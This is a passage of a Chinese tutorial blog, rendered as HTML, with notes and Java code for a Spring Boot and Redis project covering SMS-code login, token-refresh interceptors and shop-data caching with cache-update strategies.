HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 移除用户</span><br>        UserHolder.removeUser();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在config下创建MVCConfig类，将拦截器进行配置，对于一些不必要拦截的路径进行排除</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MVCConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;<br>        registry.addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginInterceptor</span>())<br>                .excludePathPatterns(<span class="hljs-string">&quot;/user/code&quot;</span>, <span class="hljs-string">&quot;/user/login&quot;</span>, <span class="hljs-string">&quot;/blog/hot&quot;</span>,<br>                        <span class="hljs-string">&quot;/shop/**&quot;</span>, <span class="hljs-string">&quot;/shop-type/**&quot;</span>, <span class="hljs-string">&quot;/voucher/**&quot;</span>, <span class="hljs-string">&quot;/upload/**&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>更改UserController中的me方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/me&quot;)</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">me</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> UserHolder.getUser();<br>    <span class="hljs-keyword">return</span> Result.ok(user);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>需要注意的是：UserHolder中将UserDTO改为User（老师视频中的代码与提供的代码有些出入）</p><h5 id="隐藏敏感信息"><a href="#隐藏敏感信息" class="headerlink" title="隐藏敏感信息"></a>隐藏敏感信息</h5><p>为了隐藏用户敏感信息，将用户信息存入Session时，需要将User转为UserDTO对象。修改流程如下：</p><ol><li><p>将UserServiceImpl中的login方法存入Session的代码更改为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 7.保存用户信息到Session</span><br>session.setAttribute(<span class="hljs-string">&quot;user&quot;</span>, BeanUtil.copyProperties(user, UserDTO.class));<br></code></pre></td></tr></table></figure></li><li><p>更改LoginInterceptor中保存用户信息到ThreadLocal的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 5.存在则保存用户信息到ThreadLocal</span><br>UserHolder.saveUser((UserDTO) user);<br></code></pre></td></tr></table></figure></li><li><p>最后将UserHolder工具类中的User全部更改为UserDTO</p></li></ol><p>更改之后重启SpringBoot，进行登录测试，此时对应的me请求返回结果就没有敏感信息了</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221025210030885.png" alt="image-20221025210030885" style="zoom: 50%;" /><h4 id="1-2-3-集群Session共享问题"><a href="#1-2-3-集群Session共享问题" class="headerlink" title="1.2.3 集群Session共享问题"></a>1.2.3 集群Session共享问题</h4><p>session共享问题：多台Tomcat并不共享session存储空间，当请求切换到不同tomcat服务时导致数据丢失的问题。</p><p>即使采用Tomcat之间拷贝Session机制，也存在拷贝时间的延迟以及内存占用问题</p><p>Session的替代方案必须满足：数据共享、内存存储、key-value结构</p><h3 id="1-3-基于Redis的短信登录"><a href="#1-3-基于Redis的短信登录" class="headerlink" title="1.3 基于Redis的短信登录"></a>1.3 基于Redis的短信登录</h3><h4 id="1-3-1-流程分析"><a href="#1-3-1-流程分析" class="headerlink" title="1.3.1 流程分析"></a>1.3.1 流程分析</h4><h5 id="服务端发送短信验证码流程-1"><a href="#服务端发送短信验证码流程-1" class="headerlink" title="服务端发送短信验证码流程"></a>服务端发送短信验证码流程</h5><p>与Session的流程基本一致</p><ol><li>服务端接收到手机号，校验手机号是否符合规则，符合则进入下一步</li><li>生成验证码，并将验证码保存到Redis中<ul><li>采用手机号作为key：<code>phone:xxxxx</code>，验证码作为value，值类型为string</li><li>设置一定时间的有效期</li></ul></li><li>发送验证码</li></ol><h5 id="短信验证码登录与注册流程-1"><a href="#短信验证码登录与注册流程-1" class="headerlink" title="短信验证码登录与注册流程"></a>短信验证码登录与注册流程</h5><ol><li>用户提交手机号与验证码，服务端校验验证码，若正确，则进入下一步</li><li>根据手机号查询信息<ul><li>若用户存在，登陆成功，保存用户到Redis</li><li>若用户不存在，用户为新用户，则将其保存到数据库中，保存用户到Redis</li><li>Redis中的用户信息：采用Token作为key，用户信息作为value，采用Hash结构存储<ul><li>Token是放于请求头中的，为了确保用户隐私与值唯一性，该Token值需要以一定规则生成</li><li>设置一定时间的有效期</li></ul></li></ul></li><li>将Token返回给前端</li></ol><h5 id="校验登录状态-1"><a href="#校验登录状态-1" class="headerlink" title="校验登录状态"></a>校验登录状态</h5><ol><li>用户访问网站，发起请求中携带着Token，通过Token从Redis中获取用户信息，判断信息是否有效<ul><li>若信息有效，用户存在，则将信息保存到ThreadLocal中，便于后续使用，并更新Token的有效期</li><li>若信息无效，用户不存在</li></ul></li></ol><h4 id="1-3-2-功能实现"><a href="#1-3-2-功能实现" class="headerlink" title="1.3.2 功能实现"></a>1.3.2 功能实现</h4><h5 id="发送短信验证码-1"><a href="#发送短信验证码-1" class="headerlink" title="发送短信验证码"></a>发送短信验证码</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">sendCode</span><span class="hljs-params">(String phone, HttpSession session)</span> &#123;<br>    <span class="hljs-comment">// 1.校验手机号</span><br>    <span class="hljs-keyword">if</span> (RegexUtils.isPhoneInvalid(phone)) &#123;<br>        <span class="hljs-comment">// 2.如果不符合，返回错误信息</span><br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;手机号格式错误！&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 3.符合，生成验证码</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> RandomUtil.randomNumbers(<span class="hljs-number">6</span>);<br>    <span class="hljs-comment">// 4.保存验证码到Redis</span><br>    template.opsForValue().set(LOGIN_CODE_KEY + phone, code, LOGIN_CODE_TTL, TimeUnit.MINUTES);<br>    <span class="hljs-comment">// 5.发送验证码</span><br>    log.debug(<span class="hljs-string">&quot;发送短信验证码成功，验证码：&#123;&#125;&quot;</span>, code);<br>    <span class="hljs-keyword">return</span> Result.ok();<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="登录与注册-1"><a href="#登录与注册-1" class="headerlink" title="登录与注册"></a>登录与注册</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">login</span><span class="hljs-params">(LoginFormDTO loginForm, HttpSession session)</span> &#123;<br>        <span class="hljs-comment">// 1.校验手机号</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">phone</span> <span class="hljs-operator">=</span> loginForm.getPhone();<br>        <span class="hljs-keyword">if</span> (RegexUtils.isPhoneInvalid(phone)) &#123;<br>            <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;手机号格式错误！&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 2.校验验证码</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">cacheCode</span> <span class="hljs-operator">=</span> template.opsForValue().get(LOGIN_CODE_KEY + phone);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> loginForm.getCode();<br>        <span class="hljs-keyword">if</span> (cacheCode == <span class="hljs-literal">null</span> || !cacheCode.equals(code)) &#123;<br>            <span class="hljs-comment">// 3.不一致报错</span><br>            <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;验证码错误&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 4.一致，根据手机号查询用户</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> query().eq(<span class="hljs-string">&quot;phone&quot;</span>, phone).one();<br>        <span class="hljs-comment">// 5.判断用户是否存在</span><br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// 6.不存在，创建用户并保存</span><br>            user = createUserWithPhone(phone);<br>        &#125;<br>        <span class="hljs-comment">// 7.保存用户信息到Redis</span><br>        <span class="hljs-comment">// 7.1.生成Token</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();<br>        <span class="hljs-comment">// 7.2.将User转为Hash存储</span><br>        <span class="hljs-type">UserDTO</span> <span class="hljs-variable">userDTO</span> <span class="hljs-operator">=</span> BeanUtil.copyProperties(user, UserDTO.class);<br>        Map&lt;String, Object&gt; userMap = BeanUtil.beanToMap(userDTO, <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(),<br>                CopyOptions.create().setIgnoreNullValue(<span class="hljs-literal">true</span>).setFieldValueEditor((name, value) -&gt; value.toString()));<br>        <span class="hljs-comment">// 7.3.存储</span><br>        template.opsForHash().putAll(LOGIN_USER_KEY + token, userMap);<br>        <span class="hljs-comment">// 7.4.设置有效期</span><br>        template.expire(LOGIN_USER_KEY + token, LOGIN_USER_TTL, TimeUnit.MINUTES);<br>        <span class="hljs-comment">// 8.返回Token</span><br>        <span class="hljs-keyword">return</span> Result.ok(token);<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221025215121245.png" alt="image-20221025215121245"></p><p>上述报错发生的原因是UserDTO中的id字段为Long类型，而Redis存储时无法使用Long类型数据</p><p>为了防止发生上述报错，可以看到7.2步骤中将User转为Hash存储时，通过BeanUtil方法，将所有字段的均转为了String类型</p><h5 id="登录校验拦截器-1"><a href="#登录校验拦截器-1" class="headerlink" title="登录校验拦截器"></a>登录校验拦截器</h5><p>只需更改preHandle中的内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 1.获取请求头中的Token</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;authorization&quot;</span>);<br>    <span class="hljs-keyword">if</span> (StrUtil.isBlank(token)) &#123;<br>        response.setStatus(<span class="hljs-number">401</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">// 2.获取Redis中的用户</span><br>    Map&lt;Object, Object&gt; userMap = template.opsForHash().entries(LOGIN_USER_KEY + token);<br><br>    <span class="hljs-comment">// 3.判断用户是否存在</span><br>    <span class="hljs-keyword">if</span> (userMap.isEmpty()) &#123;<br>        <span class="hljs-comment">// 4.不存在则拦截</span><br>        response.setStatus(<span class="hljs-number">401</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">// 5.将查询到的Hash数据转为UserDTO对象</span><br>    <span class="hljs-type">UserDTO</span> <span class="hljs-variable">userDTO</span> <span class="hljs-operator">=</span> BeanUtil.fillBeanWithMap(userMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDTO</span>(), <span class="hljs-literal">false</span>);<br>    <span class="hljs-comment">// 6.存在则保存用户信息到ThreadLocal</span><br>    UserHolder.saveUser((UserDTO) userDTO);<br>    <span class="hljs-comment">// 7.刷新Token有效期</span><br>    template.expire(LOGIN_USER_KEY + token, LOGIN_USER_TTL, TimeUnit.MINUTES);<br>    <span class="hljs-comment">// 8.放行</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-3-3-拦截器优化"><a href="#1-3-3-拦截器优化" class="headerlink" title="1.3.3 拦截器优化"></a>1.3.3 拦截器优化</h4><p>情景分析：</p><p>通过登录校验拦截器进行刷新Token的有效时间可能会存在这样一个问题：</p><ul><li>用户的请求并没有通过登录校验拦截器（如访问主页等无需校验的操作），但是用户仍然一致活跃在网页中。如果超过指定时间Token过期后，用户需要重新进行登录，这样会造成不好的用户体验。</li></ul><p>解决方案：</p><p>将之前的登录校验拦截器拆分为两个拦截器，</p><p>第一个拦截器用于：获取Token，通过Redis查询用户，保存到ThreadLocal，刷新Token有效期</p><p>第二拦截器用于：查询ThreadLocal，判断是否存在用户，存在则放行，不存在则拦截</p><ol><li><p>复制之前的 LoginInterceptor，命名为 RefreshTokenInterceptor，对preHandle方法做修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 1.获取请求头中的Token</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;authorization&quot;</span>);<br>    <span class="hljs-keyword">if</span> (StrUtil.isBlank(token)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-comment">// 2.获取Redis中的用户</span><br>    Map&lt;Object, Object&gt; userMap = template.opsForHash().entries(LOGIN_USER_KEY + token);<br>    <span class="hljs-comment">// 3.判断用户是否存在</span><br>    <span class="hljs-keyword">if</span> (userMap.isEmpty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-comment">// 4.将查询到的Hash数据转为UserDTO对象</span><br>    <span class="hljs-type">UserDTO</span> <span class="hljs-variable">userDTO</span> <span class="hljs-operator">=</span> BeanUtil.fillBeanWithMap(userMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDTO</span>(), <span class="hljs-literal">false</span>);<br>    <span class="hljs-comment">// 5.存在则保存用户信息到ThreadLocal</span><br>    UserHolder.saveUser((UserDTO) userDTO);<br>    <span class="hljs-comment">// 6.刷新Token有效期</span><br>    template.expire(LOGIN_USER_KEY + token, LOGIN_USER_TTL, TimeUnit.MINUTES);<br>    <span class="hljs-comment">// 7.放行</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>修改LoginInterceptor中的preHandle方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 判断是否需要拦截</span><br>    <span class="hljs-keyword">if</span> (UserHolder.getUser() == <span class="hljs-literal">null</span>) &#123;<br>        response.setStatus(<span class="hljs-number">401</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>修改MVCConfig类，注意两个拦截器要设置先后顺序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;<br>    registry.addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginInterceptor</span>())<br>        .excludePathPatterns(<span class="hljs-string">&quot;/user/code&quot;</span>, <span class="hljs-string">&quot;/user/login&quot;</span>, <span class="hljs-string">&quot;/blog/hot&quot;</span>,<br>                             <span class="hljs-string">&quot;/shop/**&quot;</span>, <span class="hljs-string">&quot;/shop-type/**&quot;</span>, <span class="hljs-string">&quot;/voucher/**&quot;</span>, <span class="hljs-string">&quot;/upload/**&quot;</span>)<br>        .order(<span class="hljs-number">1</span>);<br>    registry.addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RefreshTokenInterceptor</span>(template)).order(<span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="2-商户查询缓存"><a href="#2-商户查询缓存" class="headerlink" title="2. 商户查询缓存"></a>2. 商户查询缓存</h2><h3 id="2-1-缓存"><a href="#2-1-缓存" class="headerlink" title="2.1 缓存"></a>2.1 缓存</h3><p>缓存为数据交换的缓冲区（cache），是数据存储的临时地方，读写性能较高</p><p>缓存作用：</p><ol><li>降低后端负载</li><li>提高读写效率，降低响应时间</li></ol><p>缓存成本：</p><ol><li>数据一致性成本：MySQL与Redis数据一致</li><li>代码维护成本</li><li>运维成本</li></ol><h3 id="2-2-添加商户缓存"><a href="#2-2-添加商户缓存" class="headerlink" title="2.2 添加商户缓存"></a>2.2 添加商户缓存</h3><p>添加缓存之前：客户端直接请求数据库，数据库查询得到数据后返回给客户端</p><p>添加缓存之后：客户端先请求Redis，Redis若有对应数据，则直接返回；若没有，再去查询数据库，并将数据写入到Redis</p><h4 id="2-2-1-流程分析"><a href="#2-2-1-流程分析" class="headerlink" title="2.2.1 流程分析"></a>2.2.1 流程分析</h4><p>根据ID查询商户缓存流程：</p><p>根据商铺ID从Redis中查询缓存，判断缓存是否命中</p><ul><li>若命中，则返回商铺信息</li><li>若未命中，则根据ID从MySQL中查询<ul><li>若MySQL中存在，则将商铺信息写入Redis，最后返回商铺信息</li><li>若MySQL中不存在，则返回error</li></ul></li></ul><h4 id="2-2-2-功能实现"><a href="#2-2-2-功能实现" class="headerlink" title="2.2.2 功能实现"></a>2.2.2 功能实现</h4><ol><li><p>更改ShopController中的queryShopById方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">queryShopById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Long id)</span> &#123;<br>    <span class="hljs-keyword">return</span> shopService.queryById(id);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>依据之前分析的流程，在ShopService中实现该方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">queryById</span><span class="hljs-params">(Long id)</span> &#123;<br>    <span class="hljs-comment">// 1.从Redis中查询商铺缓存</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">shopJson</span> <span class="hljs-operator">=</span> template.opsForValue().get(CACHE_SHOP_KEY + id);<br>    <span class="hljs-comment">// 2.判断是否存在</span><br>    <span class="hljs-keyword">if</span> (StrUtil.isNotBlank(shopJson)) &#123;<br>        <span class="hljs-comment">// 3.存在则直接返回</span><br>        <span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> JSONUtil.toBean(shopJson, Shop.class);<br>        <span class="hljs-keyword">return</span> Result.ok(shop);<br>    &#125;<br>    <span class="hljs-comment">// 4.不存在则根据ID查询数据库</span><br>    <span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> getById(id);<br>    <span class="hljs-comment">// 5.不存在返回错误</span><br>    <span class="hljs-keyword">if</span> (shop == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;店铺不存在！&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 6.存在则写入Redis</span><br>    template.opsForValue().set(CACHE_SHOP_KEY + id, JSONUtil.toJsonStr(shop));<br>    <span class="hljs-keyword">return</span> Result.ok(shop);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="2-3-缓存更新策略"><a href="#2-3-缓存更新策略" class="headerlink" title="2.3 缓存更新策略"></a>2.3 缓存更新策略</h3><p>为了解决缓存与数据库中实际信息不一致的问题，需要引入缓存更新策略。</p><h4 id="2-3-1-策略类型"><a href="#2-3-1-策略类型" class="headerlink" title="2.3.1 策略类型"></a>2.3.1 策略类型</h4><ol><li><p>内存淘汰：</p><p>默认开启，无需维护，利用Redis的内存淘汰机制，当内存不足时自动淘汰部分数据</p><p>此策略虽然成本低，但无法确保一致性</p></li><li><p>超时剔除：</p><p>给缓存数据添加TTL时间，到期后自动删除缓存，下次查询时更新缓存</p><p>一致性一般，维护成本低</p></li><li><p>主动更新：</p><p>编写业务逻辑，在修改数据库的同时，更新缓存</p><p>一致性好，但维护成本高</p></li></ol><p>业务场景选择：</p><ul><li>低一致性需求：使用内存淘汰机制。例如：店铺类型等长时间内不会改变的缓存数据</li><li>高一致性需求：主动更新，并以超时剔除作为兜底方案。例如：店铺详情查询的缓存</li></ul><h4 id="2-3-2-主动更新策略"><a href="#2-3-2-主动更新策略" class="headerlink" title="2.3.2 主动更新策略"></a>2.3.2 主动更新策略</h4><ol><li>Cache Aside Pattern：缓存调用者在更新数据库同时更新缓存</li><li>Read&#x2F;Write Through Pattern：缓存与数据库整合为一个服务，由服务维护一致性。调用者只需调用服务，无需关心一致性问题。</li><li>Write Behind Caching Pattern：调用者只操作缓存，由其他线程异步地将缓存数据持久化到数据库中，最终保持一致</li></ol><p>第二种策略虽然简化了调用者的操作，但是维护这样一个服务复杂度较高。</p><p>第三种策略存在有一致性与可靠性问题。若缓存服务器宕机，则对于缓存所做的操作（内存层面）都会丢失。</p><p>第一种策略虽然需要手写业务逻辑，但是可控性更高，适用范围广。</p><p>操作缓存与数据库时需要考虑的问题：</p><ol><li><p>删除缓存 or 更新缓存？</p><ul><li>更新缓存：每次更新数据库时都对缓存进行更新，会导致较多的无效写操作。因此可能在此期间并没有人进行读操作。</li><li>删除缓存：更新数据库时让缓存失效，等到下一次有人查询时再通过数据库添加缓存。</li></ul></li><li><p>如何保证缓存与数据库的操作同时成功或失败？原子性问题</p><ul><li>单体系统：将缓存与数据库操作放在一个事务中</li><li>分布式系统：利用TCC等分布式事务方案</li></ul></li><li><p>先操作缓存还是先操作数据库？线程安全问题</p><ul><li><p>先删缓存，再操作数据库：</p><p>一个线程删完缓存之后，还未来得及更新数据，另一个线程便进行查询操作，而查询缓存未命中，则查询数据库，并又将旧的数据写入缓存，此时第一个线程才更新完数据。</p><p>线程不安全，造成缓存与数据库不一致的情况</p></li><li><p>先操作数据库，再删缓存：</p><p>一个线程进行查询操作，但是查询缓存未命中，则查询数据库并得到数据。而此时另一个线程进行更新数据库操作，该操作对于第一个线程是不可见的，因此第一个线程在写入缓存时，仍然写入的是旧数据。</p></li><li><p>方案二发生的可能性更低，因为需要满足缓存失效、数据库更新快于写入缓存等极端条件。因此选择方案二。</p></li></ul></li></ol><h4 id="2-3-3-代码实现"><a href="#2-3-3-代码实现" class="headerlink" title="2.3.3 代码实现"></a>2.3.3 代码实现</h4><ol><li><p>在查询代码的写入缓存逻辑中，添加缓存超时时间，作为保底方案。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 6.存在则写入Redis</span><br>template.opsForValue().set(CACHE_SHOP_KEY + id, JSONUtil.toJsonStr(shop), CACHE_SHOP_TTL, TimeUnit.MINUTES);<br></code></pre></td></tr></table></figure></li><li><p>更改ShopController中的updateShop方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PutMapping</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">updateShop</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Shop shop)</span> &#123;<br>    <span class="hljs-comment">// 写入数据库</span><br>    <span class="hljs-keyword">return</span> shopService.update(shop);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在ShopService中实现该方法：注意为确保缓存与数据库操作的原子性，需要添加事务注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Transactional</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">update</span><span class="hljs-params">(Shop shop)</span> &#123;<br>    <span class="hljs-type">Long</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> shop.getId();<br>    <span class="hljs-keyword">if</span> (id == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;店铺id不能为空&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 1.更新数据库</span><br>    updateById(shop);<br>    <span class="hljs-comment">// 2.删缓存</span><br>    